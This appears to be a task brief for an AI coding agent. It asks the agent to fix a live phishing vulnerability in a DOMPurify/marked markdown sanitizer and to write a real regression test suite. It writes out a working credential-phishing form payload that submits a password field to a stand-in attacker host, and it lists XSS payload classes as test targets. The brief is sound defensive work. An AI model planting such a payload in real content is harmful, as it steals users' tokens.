# dev-markdown-sanitize — issue #195: markdown sanitizer permits `<form action>`

## Context and urgency

**This is a live, exploitable vulnerability in the currently shipped product.**
Anyone who can open a GitHub issue on a mirrored repo can trigger it today. It
does not depend on any unreleased work.

It is nonetheless **urgent, not an emergency** — the fix is small and the
surrounding behaviour is already well characterised (see below). Do it
carefully and with real tests; do not rush and do not widen it.

Your workspace is `/workspace/farmtable-markdown-sanitize`, branch
`markdown-sanitize`, based on `origin/main` @ `7a0f220` (verified in sync with
GitHub main at dispatch time). **This is a Phase 1 / live-production file.** Do
NOT merge or rebase any Phase 2 branch into this, and do not touch anything
outside the sanitizer and its tests. Three other branches are in flight; this
one is isolated (`markdown.ts` is touched by none of them) and must stay that
way.

`origin` points at a local path, so `git fetch` and `git diff origin/main...HEAD`
work with no GitHub credentials.

---

## The vulnerability

`web/src/util/markdown.ts` is six lines and uses **default** DOMPurify config —
no `addHook`, no `ALLOWED_*` / `FORBID_*` anywhere in the repo:

```ts
export function renderMarkdown(md: string): string {
  return DOMPurify.sanitize(marked.parse(md) as string);
}
```

DOMPurify 3.4.12 / marked 15.0.12. Two sinks, both via `unsafeHTML`:
`ft-inspector-desc.ts:233` and `ft-inspector-comments.ts:221`.

**Provenance is what makes this real.** `internal/platform/github/github.go:163`
maps `issue.GetBody()` straight into `Task.Description`, and the same for
comment bodies. That content is authored by **arbitrary third parties**.

### Start from what is already known — do not redo this work

A security audit ran 29 payloads through an exact replica of the pipeline using
the project's own jsdom/DOMPurify/marked. **Script execution is solidly blocked
— 0 survivors.** `<script>`, `<iframe srcdoc>`, `<base>`, `<meta refresh>`,
`<object>`, `<embed>`, `<style>`, svg `<use>`, `<animate>`, the mXSS/mglyph
payload, every `on*=` handler, and `javascript:`/`data:` hrefs are all stripped.
`target="_blank"` is stripped, so there is no tabnabbing via markdown.

**This is not an XSS hole. It is a phishing hole.** What survives:

```
in : <form action="https://evil.example"><input name=token type=password><button>Sign in</button></form>
out: <form action="https://evil.example"><input name="token" type="password"><button>Sign in</button></form>
```

`action` is preserved verbatim; only `target`, `formaction` and `onsubmit` are
dropped. So a GitHub issue body renders a working password field inside the Farm
Table inspector. Submitting navigates the top-level page to the attacker origin
with the typed value — forms inside a shadow root submit normally. "Your Farm
Table session expired, re-enter your token", on a legitimate origin. Because
`target` is stripped the navigation **replaces** the app, which makes it more
convincing, not less.

---

## The fix

```ts
return DOMPurify.sanitize(marked.parse(md) as string, {
  FORBID_TAGS: ['form', 'input', 'button', 'select', 'textarea', 'option'],
  FORBID_ATTR: ['style', 'formaction', 'action', 'download'],
});
```

Belt and braces on purpose: forbidding both the `form` tag and the `action`
attribute means neither alone is load-bearing.

This also closes two related audit findings — **LOW-1** (`style` attribute
survives, enabling layout/overlay spoofing) and part of **LOW-2** (`<a download>`
survives).

**Before you apply it, check for collateral damage** and report what you find:

- Does any legitimate Farm Table feature depend on rendered markdown containing
  forms, inputs, buttons, or inline `style`? Check the two inspector sinks and
  anything that feeds them.
- GitHub markdown supports task-list checkboxes (`- [ ] item`), which `marked`
  may render as `<input type="checkbox">`. **Forbidding `input` will strip
  those.** Farm Table mirrors GitHub issue bodies, so task lists are realistic
  content. Decide and justify: is silently dropping checkbox rendering
  acceptable, or should they be preserved (e.g. by allowing `input` only with
  `type=checkbox` + `disabled`, or by post-processing)? **I want your reasoning
  in the report either way** — do not just pick one silently. If preserving them
  adds meaningful complexity, dropping them is an acceptable answer; degraded
  rendering beats a phishing vector. But it must be a decision, not an accident.

---

## Testing — this is the substantial part of the task

**There are currently ZERO tests for `renderMarkdown`.** No file in `web/test`
covers the sanitizer at all. The entire sanitization boundary — the security
control standing between third-party GitHub content and the DOM — is untested.
That is the real defect behind this issue, and closing it matters more than the
two-line config change.

Required:

1. **A sanitizer test suite** pinning the security properties, testing the
   **real exported `renderMarkdown`** — not a local re-implementation of the
   pipeline. (This workstream has removed thirteen self-built test oracles
   already; do not add a fourteenth. Ownership restricts writes, never reads:
   import the real symbol.)
2. **The `<form action>` payload above must be a test case**, asserting the form
   and its `action` do not survive.
3. **Regression cases for the properties that already hold** — a representative
   subset of the 29 payloads (`<script>`, `on*=` handler, `javascript:` href,
   `<iframe srcdoc>`, mXSS/mglyph). These currently pass; pin them so a future
   config change cannot silently reopen script execution while "fixing"
   something else. This is the highest-value part of the suite.
4. **Positive cases**: ordinary markdown still renders correctly — headings,
   emphasis, links with safe `href`, code blocks, lists. A sanitizer that breaks
   normal rendering is its own outage.
5. **A real mutation test.** Revert the `FORBID_*` config, paste the ACTUAL
   failing output, restore, confirm green. Then do the same for at least one
   pre-existing property (e.g. delete the whole `DOMPurify.sanitize` call and
   show the script tests fail). A claim of "verified" without pasted output will
   be sent back — this is the standing bar on this workstream.

---

## Acceptance criteria

- `<form action>` payload neutralised; `style`, `formaction`, `download` gone.
- Sanitizer test suite exists, binds to the real `renderMarkdown`, and covers
  all five categories above.
- Both mutations run with real pasted output.
- Checkbox/task-list decision made and justified in the report.
- No behaviour change to anything other than sanitization. No Phase 2 branch
  merged in. No files touched outside the sanitizer and its tests.
- Full gate green, run and pasted: `npm test`, `npx tsc --noEmit`,
  `npx tsc -p tsconfig.test.json --noEmit`, `npm run build`,
  `find dist -name '*.map' | wc -l` (must be 0), `npm audit --audit-level=low`.

## Deliverables — all required

1. Commits on branch `markdown-sanitize`.
2. A project log entry at `.design/project-log/markdown-sanitize.md` with a
   "Not done, and why" section.
3. A report at
   `/scion-volumes/scratchpad/projects/farmtable/reports/dev-markdown-sanitize.md`
   covering the fix, both mutations with real output, the checkbox decision and
   its reasoning, any collateral damage found, and anything found but not fixed.

**Do not push.** Commit locally; the manager pushes.

This gets the same three-way review as everything else on this workstream
despite being small — it is a security control on live production code.

If you discover the fix breaks legitimate rendering in a way you cannot cleanly
resolve, stop and report rather than weakening the sanitizer.

You MUST commit your work, write the project log entry, write the report file at
the exact path above, and then mark the task complete.
